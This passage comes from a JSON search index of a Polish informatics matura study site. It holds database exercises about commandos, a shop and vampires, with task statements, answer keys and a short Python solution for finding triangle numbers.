zako\u0144cz\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/triangle-numbers/answers/#zadanie-3","title":"Zadanie 3","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/triangle-numbers/answers/#odpowiedz","title":"Odpowied\u017a","text":"<pre><code>1034920260\n1116352126\n1061521926\n1109228550\n1122645420\n1055264770\n1053060778\n1183824811\n1219167510\n1204104201\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/triangle-numbers/answers/#rozwiazanie","title":"Rozwi\u0105zanie","text":"Python <pre><code>def is_triangle_number(k):\n    left = 1\n    right = k\n    while left &lt;= right:\n        middle = (left + right) // 2\n        n_sum = ((1 + middle) * middle) // 2\n        if n_sum == k:\n            return True\n        elif n_sum &lt; k:\n            left = middle + 1\n        else:\n            right = middle - 1\n\n    return False\n\n\nwith open(\"trojkatne.txt\") as file:\n    numbers = [int(line) for line in file]\n\ntriangle_numbers = [k for k in numbers if is_triangle_number(k)]\n\nprint(*triangle_numbers, sep=\"\\n\")\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/database/commandos/","title":"Komandosi","text":"<p>Dana jest baza danych dotycz\u0105ca komandos\u00f3w i ich udzia\u0142\u00f3w w r\u00f3\u017cnych misjach, zgodnie z opisem podanym poni\u017cej.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/commandos/#opis-plikow","title":"Opis plik\u00f3w","text":""},{"location":"matura-z-informatyki/przygotowanie/database/commandos/#komandosi_1","title":"Komandosi","text":"<p> komandosi.txt</p> <p>Plik komandosi.txt zawiera dane komandos\u00f3w \u2013 oddzielone \u015brednikiem pozycje:</p> <ul> <li>Id - unikalny numer identyfikacyjny komandosa,</li> <li>Imie - imi\u0119 komandosa,</li> <li>Nazwisko - nazwisko komandosa,</li> <li>Stopien - stopien komandosa.</li> </ul> <p>Pierwszy wiersz zawiera nag\u0142\u00f3wki kolumn.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/commandos/#misje","title":"Misje","text":"<p> misje.txt</p> <p>Plik misje.txt zawiera dane misji \u2013 oddzielone \u015brednikiem pozycje:</p> <ul> <li>Id - unikalny numer identyfikacyjny misji,</li> <li>Kryptonim - kryptonim misji,</li> <li>Numer dowodcy - numer dowodcy misji, identyfikator jednego z komandos\u00f3w,</li> <li>Liczba dni - d\u0142ugo\u015b\u0107 trwania misji w dniach,</li> <li>Data misji - data rozpocz\u0119cia misji.</li> </ul> <p>Pierwszy wiersz zawiera nag\u0142\u00f3wki kolumn. Daty podane s\u0105 w formacie \"RRRR-MM-DD\".</p>"},{"location":"matura-z-informatyki/przygotowanie/database/commandos/#komandosi-na-misji","title":"Komandosi na misji","text":"<p> komandosi_na_misji.txt</p> <p>Plik komandosi_na_misji.txt zawiera dane udzia\u0142u komandos\u00f3w w misjach \u2013 oddzielone \u015brednikiem pozycje:</p> <ul> <li>Numer komandosa - numer identyfikacyjny komandosa,</li> <li>Numer misji - numer identyfikacyjny misji.</li> </ul> <p>Pierwszy wiersz zawiera nag\u0142\u00f3wki kolumn.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/commandos/#umiejetnosci-specjalne","title":"Umiej\u0119tno\u015bci specjalne","text":"<p> umiejetnosci_specjalne.txt</p> <p>Plik umiejetnosci_specjalne.txt zawiera dane umiej\u0119tno\u015bci specjalnych \u2013 oddzielone \u015brednikiem pozycje:</p> <ul> <li>Id - unikalny numer identyfikacyjny umiej\u0119tno\u015bci specjalnej,</li> <li>Nazwa - nazwa umiej\u0119tno\u015bci specjalnej.</li> </ul> <p>Pierwszy wiersz zawiera nag\u0142\u00f3wki kolumn.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/commandos/#umiejetnosci-komandosow","title":"Umiej\u0119tno\u015bci komandos\u00f3w","text":"<p> umiejetnosci_komandosow.txt</p> <p>Plik umiejetnosci_komandosow.txt zawiera dane umiej\u0119tno\u015bci specjalnych komandos\u00f3w \u2013 oddzielone \u015brednikiem pozycje:</p> <ul> <li>Numer komandosa - numer identyfikacyjny komandosa,</li> <li>Numer umiejetnosci - numer identyfikacyjny umiej\u0119tno\u015bci specjalnej.</li> </ul> <p>Pierwszy wiersz zawiera nag\u0142\u00f3wki kolumn.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/commandos/#zadania","title":"Zadania","text":""},{"location":"matura-z-informatyki/przygotowanie/database/commandos/#zadanie-1","title":"Zadanie 1","text":"<p>Utw\u00f3rz zestawienie zawieraj\u0105ce imi\u0119 i nazwisko ka\u017cdego porucznika, posortowane alfabetycznie po nazwisku. Podaj imi\u0119 i nazwisko pierwszego i ostatniego porucznika.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/commandos/#zadanie-2","title":"Zadanie 2","text":"<p>Podaj, ile misji rozpocz\u0119\u0142o si\u0119 w maju.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/commandos/#zadanie-3","title":"Zadanie 3","text":"<p>Podaj ilu komandos\u00f3w nie by\u0142o dow\u00f3dc\u0105 na \u017cadnej misji. Podaj imi\u0119 i nazwisko pierwszego i ostatniego takiego komandosa po posortowaniu ich alfabetycznie po nazwisku.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/commandos/#zadanie-4","title":"Zadanie 4","text":"<p>Podaj identyfikatory, imiona i nazwiska wszystkich komandos\u00f3w, kt\u00f3rzy maj\u0105 najwi\u0119cej umiej\u0119tno\u015bci specjalnych.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/commandos/#zadanie-5","title":"Zadanie 5","text":"<p>Podaj identyfikator(y) i kryptonim(y) misji, w kt\u00f3rej bra\u0142o udzia\u0142 najwi\u0119cej komandos\u00f3w.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/commandos/#zadanie-6","title":"Zadanie 6","text":"<p>Podaj liczb\u0119 misji oraz kryptonim misji o najmniejszym identyfikatorze i najwi\u0119kszym identyfikatorze, w kt\u00f3rych nie bra\u0142 udzia\u0142u (tzn. nie by\u0142 tak\u017ce dow\u00f3dc\u0105) \u017caden major o specjalno\u015bci innej ni\u017c Specjalista IT.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/commandos/#zadanie-7","title":"Zadanie 7","text":"<p>Podaj identyfikatory, imiona i nazwiska wszystkich komandos\u00f3w, kt\u00f3rzy sp\u0119dzili na misjach sumarycznie najwi\u0119cej czasu, ignoruj\u0105c ich udzia\u0142 jako dow\u00f3dc\u00f3w. Podaj tak\u017ce, ile dni sp\u0119dzili na misjach.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/commandos/#zadanie-8","title":"Zadanie 8","text":"<p>Podaj kryptonim(y) misji, kt\u00f3ra zako\u0144czy\u0142a si\u0119 najp\u00f3\u017aniej oraz kryptonim(y) misji, kt\u00f3ra zako\u0144czy\u0142a si\u0119 najwcze\u015bniej.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/commandos/#zadanie-9","title":"Zadanie 9","text":"<p>Dla ka\u017cdej specjalno\u015bci oblicz, na ilu misjach pojawi\u0142 si\u0119 przynajmniej jeden komandos (jako uczestnik, nie dow\u00f3dca) z t\u0105 specjalno\u015bci\u0105.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/commandos/#zadanie-10","title":"Zadanie 10","text":"<p>Dla ka\u017cdego kwarta\u0142u w roku (stycze\u0144-marzec, kwiecie\u0144-czerwiec, lipiec-wrzesie\u0144, pa\u017adziernik-grudzie\u0144) oblicz ile misji zacz\u0119\u0142o si\u0119 w tym okresie.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/commandos/answers/","title":"Odpowiedzi","text":""},{"location":"matura-z-informatyki/przygotowanie/database/commandos/answers/#zadanie-1","title":"Zadanie 1","text":"Imie Nazwisko Olaf Apostel Oliwier Wiekiera"},{"location":"matura-z-informatyki/przygotowanie/database/commandos/answers/#zadanie-2","title":"Zadanie 2","text":"<p>Odpowied\u017a: 5</p>"},{"location":"matura-z-informatyki/przygotowanie/database/commandos/answers/#zadanie-3","title":"Zadanie 3","text":"<p>Odpowied\u017a: 158</p> Imie Nazwisko Sonia Andryszczyk Alex Zysk"},{"location":"matura-z-informatyki/przygotowanie/database/commandos/answers/#zadanie-4","title":"Zadanie 4","text":"Imie Nazwisko Leon Durlak Jakub Gregorowicz Oliwier Duczmal Wojciech Bartela Radoslaw Krolczyk Ryszard Smyl"},{"location":"matura-z-informatyki/przygotowanie/database/commandos/answers/#zadanie-5","title":"Zadanie 5","text":"Id Kryptonim 36 plodzien"},{"location":"matura-z-informatyki/przygotowanie/database/commandos/answers/#zadanie-6","title":"Zadanie 6","text":"<p>Odpowied\u017a: 12</p> Id Kryptonim 3 fpuh 46 grupa"},{"location":"matura-z-informatyki/przygotowanie/database/commandos/answers/#zadanie-7","title":"Zadanie 7","text":"Id Imie Nazwisko Liczba dni 120 Alex Zysk 1259"},{"location":"matura-z-informatyki/przygotowanie/database/commandos/answers/#zadanie-8","title":"Zadanie 8","text":"<p>Najp\u00f3\u017aniej: lachacz-kudelka</p> <p>Najwcze\u015bniej: grupa</p>"},{"location":"matura-z-informatyki/przygotowanie/database/commandos/answers/#zadanie-9","title":"Zadanie 9","text":"Nazwa Liczba misji Instruktor przetrwania 38 Medyk polowy 41 Nurek bojowy 44 Saper 41 Skoczek spadochronowy 44 Snajper 39 Specjalista ds. komunikacji 39 Specjalista IT 31"},{"location":"matura-z-informatyki/przygotowanie/database/commandos/answers/#zadanie-10","title":"Zadanie 10","text":"Kwarta\u0142 I Kwarta\u0142 II Kwarta\u0142 III Kwarta\u0142 IV 13 16 8 13"},{"location":"matura-z-informatyki/przygotowanie/database/commandos/solution/","title":"Rozwi\u0105zanie","text":"<p> Rozwi\u0105zanie</p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/","title":"Sklep","text":"<p>Dana jest baza danych dotycz\u0105ca sklepu, jego klient\u00f3w i prowadzonej sprzeda\u017cy, zgodnie z opisem podanym poni\u017cej.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/#opis-plikow","title":"Opis plik\u00f3w","text":""},{"location":"matura-z-informatyki/przygotowanie/database/shop/#artykuy","title":"Artyku\u0142y","text":"<p> artykuly.txt</p> <p>Plik artykuly.txt zawiera dane sprzedawanych towar\u00f3w \u2013 oddzielone \u015brednikiem pozycje:</p> <ul> <li>Id - unikalny numer identyfikacyjny produktu,</li> <li>nazwa - nazwa produktu,</li> <li>cena - liczba rzeczywista z dwoma miejscami po przecinku, cena za kg.</li> </ul> <p>Pierwszy wiersz zawiera nag\u0142\u00f3wki kolumn.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/#klienci","title":"Klienci","text":"<p> klienci.txt</p> <p>Plik klienci.txt zawiera dane klient\u00f3w sklepu \u2013 oddzielone \u015brednikiem pozycje:</p> <ul> <li>Id - unikalny numer identyfikacyjny klienta,</li> <li>Imie - imi\u0119 klienta,</li> <li>Nazwisko - nazwisko klienta,</li> <li>Miasto - miasto zamieszkania klienta,</li> <li>Ulica - ulica zamieszkania klienta,</li> <li>Kod pocztowy - kod pocztowy.</li> </ul> <p>Pierwszy wiersz zawiera nag\u0142\u00f3wki kolumn. </p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/#zamowienia","title":"Zam\u00f3wienia","text":"<p> zamowienia.txt</p> <p>Plik zamowienia.txt zawiera dane z\u0142o\u017conych przez klient\u00f3w zam\u00f3wie\u0144 \u2013 oddzielone \u015brednikiem pozycje:</p> <ul> <li>Id - unikalny numer identyfikacyjny zam\u00f3wienia,</li> <li>Artykul id - numer identyfikacyjny artyku\u0142u,</li> <li>Klient id - numer identyfikacyjny klienta,</li> <li>Liczba kg - liczba zam\u00f3wionych kilogram\u00f3w.</li> <li>Data zam\u00f3wienia - data zam\u00f3wienia w formacie \"RRRR-MM-DD\".</li> </ul> <p>Pierwszy wiersz zawiera nag\u0142\u00f3wki kolumn.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/#zadania","title":"Zadania","text":""},{"location":"matura-z-informatyki/przygotowanie/database/shop/#zadanie-1","title":"Zadanie 1","text":"<p>Podaj imi\u0119 i nazwisko klienta (klient\u00f3w), kt\u00f3ry zap\u0142aci\u0142 \u0142\u0105cznie najwi\u0119cej za swoje zam\u00f3wienia. Pami\u0119taj, \u017ce koszt jednego zam\u00f3wienia, to liczba zam\u00f3wionych kilogram\u00f3w przemno\u017cona przez cen\u0119 za kg.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/#zadanie-2","title":"Zadanie 2","text":"<p>Podaj imiona i nazwiska wszystkich klient\u00f3w, kt\u00f3rzy nie z\u0142o\u017cyli \u017cadnego zam\u00f3wienia.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/#zadanie-3","title":"Zadanie 3","text":"<p>Podaj nazwy wszystkich artyku\u0142\u00f3w, kt\u00f3re nie zosta\u0142y w og\u00f3le zam\u00f3wione.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/#zadanie-4","title":"Zadanie 4","text":"<p>Podaj ile artyku\u0142\u00f3w nie zosta\u0142o zam\u00f3wionych w 2021 roku</p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/#zadanie-5","title":"Zadanie 5","text":"<p>Znajd\u017a miesi\u0105c (ignoruj\u0105c rok), w kt\u00f3rym by\u0142o najwi\u0119cej zam\u00f3wie\u0144. Podaj nazw\u0119 tego miesi\u0105ca i liczb\u0119 zam\u00f3wie\u0144 w tym miesi\u0105cu. Je\u017celi jest kilka takich miesi\u0119cy, podaj wszystkie.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/#zadanie-6","title":"Zadanie 6","text":"<p>Podaj nazw\u0119 miejscowo\u015bci, kt\u00f3rej mieszka\u0144cy zam\u00f3wili \u0142\u0105cznie najwi\u0119cej kg artyku\u0142\u00f3w. Podaj tak\u017ce \u0142\u0105czn\u0105 wag\u0119 artyku\u0142\u00f3w, kt\u00f3re zam\u00f3wili mieszka\u0144cy z tej miejscowo\u015bci. Je\u017celi jest kilka takich miejscowo\u015bci, podaj wszystkie.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/#zadanie-7","title":"Zadanie 7","text":"<p>Podaj ile \u0142\u0105cznie zam\u00f3wie\u0144 z\u0142o\u017cyli klienci, u kt\u00f3rych w dw\u00f3ch pierwszych cyfrach kodu pocztowego wyst\u0119puje cyfra 8.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/#zadanie-8","title":"Zadanie 8","text":"<p>Zak\u0142adaj\u0105c, \u017ce imi\u0119 \u017ce\u0144skie ko\u0144czy si\u0119 zawsze na liter\u0119 a, podaj liczb\u0119 zam\u00f3wie\u0144, \u0142\u0105czn\u0105 liczb\u0119 zam\u00f3wionych kilogram\u00f3w, sumaryczny koszt zam\u00f3wie\u0144 oraz \u015bredni koszt zam\u00f3wie\u0144 (z dok\u0142adno\u015bci\u0105 do dw\u00f3ch cyfr po przecinku) z podzia\u0142em na kobiety i m\u0119\u017cczyzn.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/#zadanie-9","title":"Zadanie 9","text":"<p>Zak\u0142adaj\u0105c, \u017ce imi\u0119 \u017ce\u0144skie ko\u0144czy si\u0119 zawsze na liter\u0119 a, podaj kt\u00f3ry artyku\u0142 by\u0142 najcz\u0119\u015bciej zamawiany przez kobiety, a kt\u00f3ry przez m\u0119\u017cczyzn.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/#zadanie-10","title":"Zadanie 10","text":"<p>Znajd\u017a klienta (klient\u00f3w), kt\u00f3ry z\u0142o\u017cy\u0142 zam\u00f3wienie na najwi\u0119ksz\u0105 ilo\u015b\u0107 r\u00f3\u017cnych artyku\u0142\u00f3w. Podaj imi\u0119, nazwisko i liczb\u0119 unikalnych artyku\u0142\u00f3w, kt\u00f3re zam\u00f3wi\u0142.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/#zadanie-11","title":"Zadanie 11","text":"<p>Oblicz \u015bredni\u0105 warto\u015b\u0107 zam\u00f3wienia dla ka\u017cdego miasta. Podaj nazwy miast wraz ze \u015bredni\u0105 warto\u015bci\u0105 zam\u00f3wienia, w kt\u00f3rych ta warto\u015b\u0107 jest najwi\u0119ksza oraz te, w kt\u00f3rych jest ona najmniejsza.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/#zadanie-12","title":"Zadanie 12","text":"<p>Podaj imi\u0119 i nazwisko klienta (klient\u00f3w), kt\u00f3ry z\u0142o\u017cy\u0142 pierwsze zam\u00f3wienie oraz klienta (klient\u00f3w), kt\u00f3ry z\u0142o\u017cy\u0142 ostatnie zam\u00f3wienie. Podaj tak\u017ce daty tych zam\u00f3wie\u0144.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/#zadanie-13","title":"Zadanie 13","text":"<p>Dla ka\u017cdego artyku\u0142u oblicz liczb\u0119 zam\u00f3wie\u0144 oraz \u015bredni\u0105 liczb\u0119 zam\u00f3wionych kilogram\u00f3w na zam\u00f3wienie, z dok\u0142adno\u015bci\u0105 do dw\u00f3ch cyfr po przecinku. Podaj nazw\u0119, liczb\u0119 zam\u00f3wie\u0144 oraz \u015bredni\u0105 liczb\u0119 zam\u00f3wie\u0144 artyku\u0142u (artyku\u0142\u00f3w), kt\u00f3ry by\u0142 najcz\u0119\u015bciej zamawiany oraz tego, kt\u00f3ry by\u0142 najrzadziej zamawiany.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/#zadanie-14","title":"Zadanie 14","text":"<p>Podaj ile artyku\u0142\u00f3w mia\u0142o w 2021 roku wi\u0119ksz\u0105 \u0142\u0105czn\u0105 sprzeda\u017c w kg ni\u017c w 2020 roku.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/#zadanie-15","title":"Zadanie 15","text":"<p>Oblicz i por\u00f3wnaj \u0142\u0105czn\u0105 warto\u015b\u0107 zam\u00f3wie\u0144 z\u0142o\u017conych przez klient\u00f3w z kodem pocztowym zaczynaj\u0105cym si\u0119 na cyfr\u0119 \"1\" oraz klient\u00f3w z kodem pocztowym zaczynaj\u0105cym si\u0119 na cyfr\u0119 \"2\". Podaj, kt\u00f3ra grupa klient\u00f3w wyda\u0142a wi\u0119cej.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/#zadanie-16","title":"Zadanie 16","text":"<p>Podaj ile klient\u00f3w ma kod pocztowy ko\u0144cz\u0105cy si\u0119 na cyfr\u0119 parzyst\u0105, a ile na nieparzyst\u0105.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/#zadanie-17","title":"Zadanie 17","text":"<p>Zam\u00f3wienia dzielimy pod wzgl\u0119dem zam\u00f3wionej liczby kg na:</p> <ul> <li>ma\u0142e - poni\u017cej 10 kg,</li> <li>\u015brednie - od 10 do 30 kg,</li> <li>du\u017ce - powy\u017cej 30 kg.</li> </ul> <p>Podaj \u0142\u0105czn\u0105 liczb\u0119 zam\u00f3wie\u0144 dla ka\u017cdej z kategorii.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/answers/","title":"Odpowiedzi","text":""},{"location":"matura-z-informatyki/przygotowanie/database/shop/answers/#zadanie-1","title":"Zadanie 1","text":"<p>Marika Koska</p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/answers/#zadanie-2","title":"Zadanie 2","text":"Imie Nazwisko Pawel Cieplucha Oliwier Dworniczak Maksymilian Kobryn Olga Kielbik Adrian Buszta Filip Walocha Hubert Kajdas Grzegorz Kruszka Daniel Bernatek Aurelia Moczko Klara Kus"},{"location":"matura-z-informatyki/przygotowanie/database/shop/answers/#zadanie-3","title":"Zadanie 3","text":"Nazwa kukurydza batat"},{"location":"matura-z-informatyki/przygotowanie/database/shop/answers/#zadanie-4","title":"Zadanie 4","text":"<p>Odpowied\u017a: 29</p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/answers/#zadanie-5","title":"Zadanie 5","text":"Miesi\u0105c Liczba zam\u00f3wie\u0144 Listopad 24"},{"location":"matura-z-informatyki/przygotowanie/database/shop/answers/#zadanie-6","title":"Zadanie 6","text":"<p>Rumia</p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/answers/#zadanie-7","title":"Zadanie 7","text":"<p>Odpowied\u017a: 36</p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/answers/#zadanie-8","title":"Zadanie 8","text":"<p>Kobiety:</p> Liczba zam\u00f3wie\u0144 \u0141\u0105czna liczba kg Sumaryczny koszt zam\u00f3wie\u0144 \u015aredni koszt zam\u00f3wie\u0144 82 2277 20 824 181,46 z\u0142 253 953,43 z\u0142 <p>Me\u017cczyzni:</p> Liczba zam\u00f3wie\u0144 \u0141\u0105czna liczba kg Sumaryczny koszt zam\u00f3wie\u0144 \u015aredni koszt zam\u00f3wie\u0144 118 2970 14 794 632,96 z\u0142 125 378,25 z\u0142"},{"location":"matura-z-informatyki/przygotowanie/database/shop/answers/#zadanie-9","title":"Zadanie 9","text":"<p>Artyku\u0142y zamawiane najcz\u0119\u015bciej przez kobiety: endywia, kokos, limonka, pomidor.</p> <p>Artyku\u0142 zamawiany najcz\u0119\u015bciej przez m\u0119\u017cczyzn: kokos.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/answers/#zadanie-10","title":"Zadanie 10","text":"Imie Nazwisko Liczba unikalnych zam\u00f3wie\u0144 Marika Koska 6 Marcin Odrzywolek 6"},{"location":"matura-z-informatyki/przygotowanie/database/shop/answers/#zadanie-11","title":"Zadanie 11","text":"<p>Najwi\u0119ksza:</p> <p>Legionowo 2232517,86 z\u0142</p> <p>Najmniejsza:</p> <p>Gniezna 25,09 z\u0142</p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/answers/#zadanie-12","title":"Zadanie 12","text":"<p>Pierwsze zam\u00f3wienie: Nataniel Cherek 22.04.2019</p> <p>Ostatnie zam\u00f3wienie: Marika Koska 03.04.2024</p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/answers/#zadanie-13","title":"Zadanie 13","text":"<p>Najcz\u0119\u015bciej zamawiane:</p> Nazwa \u015arednia liczba kg Liczba zam\u00f3wie\u0144 kokos 25,78 9 <p>Najrzadziej zamawiane:</p> Nazwa \u015arednia liczba kg Liczba zam\u00f3wie\u0144 groszek 45,00 1 melon 13,00 1 mango 8,00 1 jablko 34,00 1"},{"location":"matura-z-informatyki/przygotowanie/database/shop/answers/#zadanie-14","title":"Zadanie 14","text":"<p>Odpowied\u017a: 8</p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/answers/#zadanie-15","title":"Zadanie 15","text":"Pierwsza cyfra \u0141\u0105czna warto\u015b\u0107 zam\u00f3wie\u0144 1 1 553 709,72 z\u0142 2 5 328 174,52 z\u0142 <p>Grupa z cyfr\u0105 \"2\" wyda\u0142a wi\u0119cej.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/answers/#zadanie-16","title":"Zadanie 16","text":"<p>Parzyste: 48</p> <p>Nieparzyste: 52</p>"},{"location":"matura-z-informatyki/przygotowanie/database/shop/answers/#zadanie-17","title":"Zadanie 17","text":"Rodzaj Liczba zam\u00f3wie\u0144 du\u017ce 80 \u015brednie 93 ma\u0142e 27"},{"location":"matura-z-informatyki/przygotowanie/database/shop/solution/","title":"Rozwi\u0105zanie","text":"<p> Rozwi\u0105zanie</p>"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/","title":"Wampiry","text":""},{"location":"matura-z-informatyki/przygotowanie/database/vampires/#wprowadzenie","title":"Wprowadzenie","text":"<p>Pan J\u00f3zef von St\u0105d jest znanym badaczem wampir\u00f3w. Od wielu lat prowadzi zapiski dotycz\u0105ce tych niezwyk\u0142ych stworze\u0144, kt\u00f3re zebra\u0142 i zapisa\u0142 w kilku plikach tekstowych, opisanych poni\u017cej.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/#klany","title":"Klany","text":"<p> Klany.txt</p> <p>Plik Klany.txt zawiera dane klan\u00f3w \u2013 oddzielone \u015brednikiem pozycje: </p> <ul> <li>KlanID - numer identyfikacyjny klanu,</li> <li>Nazwa - nazwa klanu,</li> <li>DataZalozenia - data za\u0142o\u017cenia klanu,</li> <li>KrajPochodzenia - kraj, w kt\u00f3rym klan zosta\u0142 za\u0142o\u017cony.</li> </ul> <p>Pierwszy wiersz zawiera nag\u0142\u00f3wki kolumn. Daty podane s\u0105 w formacie \"DD.MM.RRRR\".</p>"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/#wampiry_1","title":"Wampiry","text":"<p> Wampiry.txt</p> <p>Plik Wampiry.txt zawiera dane klan\u00f3w \u2013 oddzielone \u015brednikiem pozycje: </p> <ul> <li>WampirID - numer identyfikacyjny wampira,</li> <li>Imie - imi\u0119 wampira,</li> <li>DataUrodzenia - data urodzenia wampira,</li> <li>DataPrzemiany - data przemiany w wampira,</li> <li>KrajPochodzenia - kraj pochodzenia wampira,</li> <li>KlanID - numer identyfikacyjny klanu, do kt\u00f3rego wampir przynale\u017cy.</li> </ul> <p>Pierwszy wiersz zawiera nag\u0142\u00f3wki kolumn. Daty podane s\u0105 w formacie \"DD.MM.RRRR\".</p>"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/#ofiary","title":"Ofiary","text":"<p> Ofiary.txt</p> <p>Plik Ofiary.txt zawiera dane klan\u00f3w \u2013 oddzielone \u015brednikiem pozycje: </p> <ul> <li>OfiaraID - numer identyfikacyjny ofiary,</li> <li>Imie - imi\u0119 ofiary,</li> <li>DataUrodzenia - data urodzenia,</li> <li>DataZgonu - data zgonu.</li> </ul> <p>Pierwszy wiersz zawiera nag\u0142\u00f3wki kolumn. Daty podane s\u0105 w formacie \"DD.MM.RRRR\".</p>"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/#ataki","title":"Ataki","text":"<p> Ataki.txt</p> <p>Plik Ataki.txt zawiera dane klan\u00f3w \u2013 oddzielone \u015brednikiem pozycje: </p> <ul> <li>AtakID - numer identyfikacyjny ataku,</li> <li>WampirID - numer identyfikacyjny wampira, kt\u00f3ry dokona\u0142 ataku,</li> <li>OfiaraID - numer identyfikacyjny ofiary ataku,</li> <li>DataAtaku - data ataku,</li> <li>Lokalizacja - lokalizacja ataku, jedna z trzech warto\u015bci:</li> <li>\"Wampir\" - atak mia\u0142 miejsce w kraju pochodzenia wampira,</li> <li>\"Klan\" - atak mia\u0142 miejsce w kraju za\u0142o\u017cenia klanu,</li> <li>\"Zagranica\" - atak mia\u0142 miejsce w innym kraju, niezwi\u0105zanym z wampirem ani klanem (takie miejsca nie interesuj\u0105 Pana J\u00f3zefa).</li> </ul> <p>Pierwszy wiersz zawiera nag\u0142\u00f3wki kolumn. Daty podane s\u0105 w formacie \"DD.MM.RRRR\".</p>"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/#zadania","title":"Zadania","text":"<p>Zacznij od stworzenia tabel Klany, Wampiry, Ofiary oraz Ataki importuj\u0105c dane z odpowiednich, wymienionych wy\u017cej plik\u00f3w tekstowych. W ka\u017cdej z tabel zdefiniuj odpowiedni klucz podstawowy (na podstawie pola istniej\u0105cego ju\u017c w tabeli, albo nowo utworzonego). Utw\u00f3rz odpowiednie relacje pomi\u0119dzy tabelami.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/#zadanie-1","title":"Zadanie 1","text":"<p>Wypisz, w kolejno\u015bci alfabetycznej, imiona wszystkich wampir\u00f3w pochodz\u0105cych z Rumunii.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/#zadanie-2","title":"Zadanie 2","text":"<p>Utw\u00f3rz zestawienie zawieraj\u0105ce imi\u0119 wampira oraz liczb\u0119 dokonanych przez niego atak\u00f3w. Wyniki posortuj rosn\u0105co po liczbie atak\u00f3w.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/#zadanie-3","title":"Zadanie 3","text":"<p>Utw\u00f3rz zestawienie zawieraj\u0105ce imi\u0119 wampira, dat\u0119 przemiany oraz dat\u0119 pierwszego ataku. Wyniki posortuj rosn\u0105co po czasie, jaki up\u0142yn\u0105\u0142 od przemiany do pierwszego ataku. Wypisz tylko te wampiry, kt\u00f3re dokona\u0142y co najmniej jednego ataku.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/#zadanie-4","title":"Zadanie 4","text":"<p>Wypisz imiona wszystkich wampir\u00f3w, kt\u00f3re nie dokona\u0142y \u017cadnego ataku. Wynik posortuj alfabetycznie po imionach.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/#zadanie-5","title":"Zadanie 5","text":"<p>Wypisz imi\u0119 wampira, kt\u00f3ry musia\u0142 najd\u0142u\u017cej czeka\u0107 na przemian\u0119 od swoich urodzin. Je\u017celi jest kilku takich wampir\u00f3w, wypisz wszystkich.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/#zadanie-6","title":"Zadanie 6","text":"<p>Utw\u00f3rz zestawienie zawieraj\u0105ce imi\u0119 ofiary, dat\u0119 ataku, imi\u0119 wampira, kt\u00f3ry dokona\u0142 ataku, oraz nazw\u0119 klanu, do kt\u00f3rego nale\u017cy wampir.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/#zadanie-7","title":"Zadanie 7","text":"<p>Utw\u00f3rz zestawienie zawieraj\u0105ce imi\u0119 ofiary oraz liczb\u0119 atak\u00f3w, kt\u00f3re zosta\u0142y na ni\u0105 przeprowadzone. Posortuj alfabetycznie po imionach.</p>"},{"location":"matura-z-informatyki/przygotowanie/database/vampires/#zadanie-8","title":"Zadanie 8","text":"<p>Wypisz imiona wszystkich ofiar, kt\u00f3re zgin\u0119\u0142y bezpo\u015brednio w wyniku ataku, tzn. data jednego z atak\u00f3w przeprowadzonego na dan\u0105 